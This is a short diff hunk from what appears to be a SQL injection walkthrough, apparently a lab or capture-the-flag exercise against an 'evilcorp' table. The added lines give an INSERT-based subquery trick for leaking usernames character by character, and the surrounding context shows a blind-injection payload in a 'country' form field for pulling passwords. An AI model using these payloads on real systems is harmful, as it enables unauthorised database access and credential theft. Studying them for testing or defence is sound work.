@@ -264,6 +264,16 @@ Yes. So for our guesses, we have quickly figured out:
 
   However, if you have successfully confirmed the existence of the "password" column within the "evilcorp" table, you can attempt to extract the data character by character using techniques such as substring extraction.
 
+
+
+    The goal is to extract from the users table. Using below method will encounter problems because cannot directly insert into a table you're selecting from within the same statement. 
+
+There's some alien tier workaround here: 
+
+    
+INSERT INTO users (username, country) VALUES ('joe', '' OR ASCII(SUBSTRING((SELECT username FROM (SELECT * FROM users LIMIT 1) AS sub), 1, 1)) = 98);
+
+    
 Here's an example payload that extracts the contents of the "password" column character by character:
 
 name=dbusersguess&country=' OR ASCII(SUBSTRING((SELECT password FROM evilcorp LIMIT A,1), X, 1)) = Y) --
